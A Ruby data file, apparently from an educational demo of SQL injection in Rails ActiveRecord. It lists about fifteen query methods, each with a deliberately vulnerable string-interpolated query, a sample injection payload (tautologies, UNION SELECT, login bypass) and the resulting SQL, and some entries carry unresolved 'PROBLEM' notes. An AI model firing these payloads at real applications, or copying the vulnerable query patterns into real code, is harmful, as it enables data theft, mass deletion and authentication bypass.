Queries = [
  {
    :action => :calculate,
    :name => "Calculate Methods",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Calculations.html#method-i-calculate",
    :query => "User.calculate(:count, payload[:column])",
    :input => {:name => :column, :example => "first_name) from users where is_admin=true;--"},
    :example => "This example allows you to finds the age of a specific user, rather than the sum of order amounts.",
    :sql => "SELECT COUNT(users.[REPLACE]) FROM users"
  },

  {
    :action => :delete_by,
    :name => "Delete By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-delete_by",
    :query => 'OrderProduct.delete_by("id = #{payload[:id]}")',
    :input => {:name => :id, :example => '1) OR 1=1--'},
    :example => "This example bypasses any conditions and deletes all users.",
    :sql => 'DELETE FROM "order_products" WHERE (id = [REPLACE])'
  },

  {
    :action => :destroy_by,
    :name => "Destroy By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-destroy_by",
    :query => 'User.destroy_by(["id = ? AND is_admin = #{payload[:is_admin]}", params[:id]])',
    :input => {:name => :is_admin, :example => "false) OR 1=1 --"},
    :example => "This example bypasses any conditions and deletes all users.",
    :sql => 'SELECT "users".* FROM "users" WHERE (id = NULL AND is_admin = [REPLACE])',
  },

  {
    :action => :exists,
    :name => "Exists? Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-exists-3F",
    :query => 'User.exists? ["last_name LIKE \'#{payload[:user]}%%\'"]',
    :input => {:name => :user, :example => "' OR is_admin=true and first_name LIKE 'A" },
    :example => "This is more obvious than the example above, but demonstrates checking another table for a given value.",
    :sql => "SELECT 1 AS one FROM users WHERE (last_name LIKE '[REPLACE]%') LIMIT $1  [[\"LIMIT\", 1]]",
  },

  {
    :action => :find_by,
    :name => "Find By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-find_by",
    :query => 'User.find_by("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'#{params[:password]}\'")',
    :input => {:name => :first_name, :example => "') OR 1=$1 --"},
    :example => 'This example would likely be found in a login-type flow and gives you an opportunity to either find a specific user by name, or return the first user in the database',
    :sql => "SELECT users.* FROM users WHERE (first_name = '[REPLACE]' AND pw_hash = '')"
  },

  {
    :action => :from_method,
    :name => "From Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-from",
    :query => "User.from(payload[:from]).where(credit_card: false)",
    :input => {:name => :from, :example => "users WHERE admin = '1' OR ''=?;"},
    :example => "Instead of returning all non-admin users, we return all admin users.",
    :sql => "REPLACE",
    :desc => <<-MD
The `from` method accepts arbitrary SQL. PROBLEM: think of an example where the from table is user controlled.
    MD
  },

  {
    :action => :group_method,
    :name => "Group Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-group",
    :query => "User.where(is_admin: false).group(payload[:group])",
    :input => {:name => :group, :example => "product_id"},
    :example => "The intent of this query is to group non-admin users by the specified column. Instead, the query returns all users.",
    :sql => "SELECT order_products.[REPLACE], sum(quantity) FROM order_products GROUP BY order_products.[REPLACE] LIMIT $1",
    :prob => "PROBLEM, the column referenced by group_by must exist in the select clause per SQL syntax.  If both are dynamic, then the injection would be into the select clause not the group clause"
  },

  {
    :action => :having,
    :name => "Having Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-having",
    :query => 'Order.where(:user_id => 1).group(:user_id).having("total > #{payload[:total]}")',
    :input => {:name => :total, :example => "1) UNION SELECT * FROM orders--"},
    :example => "This input injects a union in order to return all orders, instead of just the orders from a single user.",
    :sql => "REPLACE",
    :prob => "PROBLEM, the column referenced by group_by must exist in the select clause per SQL syntax.  If both are dynamic, then the injection would be into the select clause not the group clause",
    :desc => "The `having` method does not escape its input and is easy to use for SQL injection since it tends to be at the end of a query."
  },


  {
    :action => :joins,
    :name => "Joins Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-joins",
    :query => 'Order.joins(payload[:table]).where("total > 1000").all',
    :input => {:name => :table, :example => "--"},
    :example => 'Skip WHERE clause and return all orders instead of just the orders for the specified user.',
    :sql => "REPLACE",
    :desc => 'The `joins` method can take an array of associations or straight SQL strings.',
    :prob => 'Again, when would the table name for a join be user controlled input'
  },

  {
    :action => :lock,
    :name => "Lock Method and Option",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-lock",
    :query => "User.where('id > 1').lock(payload[:lock])",
    :input => {:name => :lock, :example => "?"},
    :example => "The value is database dependent.  Unlikely to be a user controlled variable, but may be a hidden parameter designed to control behavior of different queries executed from the same form. Postgres values include FOR UPDATE, FOR SHARE, and FOR NO KEY UPDATE.  The value specified is directly appended to the end of the query, but after the LIMIT clause so it is too late for a UNION.  Can add OFFSET to select a different record than intended by the application e.g. OFFSET 1",
    :sql => "SELECT users.* FROM users WHERE (id > 1) LIMIT $1 [REPLACE]",
  },

  {
    :action => :not,
    :name => "Not Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods/WhereChain.html#method-i-not",
    :query => 'User.where.not("is_admin = true OR id IN (#{payload[:excluded]})").all',
    :input => {:name => :excluded, :example => "1)) OR 1=1 --"},
    :example => "Return all users, even if they are administrators.",
    :sql => "SELECT users.* FROM users WHERE NOT (is_admin = true OR id IN ([REPLACE])) LIMIT $1",
  },

  {
    :action => :select_method,
    :name => 'Select Method',
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-select",
    :query => 'User.select(payload[:column])',
    :input => {:name => :column, :example => "* FROM USERS WHERE 0!=$1; --"},
    :example => 'Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected.',
    :sql => "SELECT [REPLACE] FROM users LIMIT $1",
  },

  {
    :action => :reselect_method,
    :name => 'Reselect Method',
    :link => 'https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-reselect',
    :query => 'User.select(:name).reselect(payload[:column])',
    :input => {:name => :column, :example => "* FROM orders WHERE 0!=$1;-- "},
    :example => 'This is the same as `select`. Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected, including querying totally different tables than intended.',
    :sql => "SELECT [REPLACE] FROM users LIMIT $1",
  },

  {
    :action => :where,
    :name => "Where Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-where",
    :query => 'User.where("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'SUBMITTED_PASSWORD\'")',
    :input => {:name => :first_name, :example => "') OR 1--"},
    :example => 'The example below is using classic SQL injection to bypass authentication.',
    :sql => "SELECT users.* FROM users WHERE (first_name = '[REPLACE]' AND pw_hash = 'SUBMITTED_PASSWORD') LIMIT $1",
  },

  {
    :action => :rewhere,
    :name => "Rewhere Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-rewhere",
    :query => 'User.where(first_name: "Bob").rewhere("email LIKE \'#{payload[:search]}%\'")',
    :input => {:name => :search, :example => "a') OR 0!=$2--'"},
    :example => 'Adds a new clause to the statement connected using AND',
    :sql => "SELECT users.* FROM users WHERE users.first_name = $1 AND (email LIKE '[REPLACE]%') LIMIT $2",
  },

  {
    :action => :update_all_method,
    :name => "Update All Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-update_all",
    :query => 'User.update_all("is_admin = true WHERE id IN (#{payload[:id_list]})")',
    :input => {:name => :id_list, :example => '\' OR 1=1;'},
    :example => "Update every user to be an admin.",
    :sql => "UPDATE users SET is_admin = true WHERE id IN ([REPLACE])",
    :prob => "Generates correct SQL, but doesn't modify the databse"
  },
]
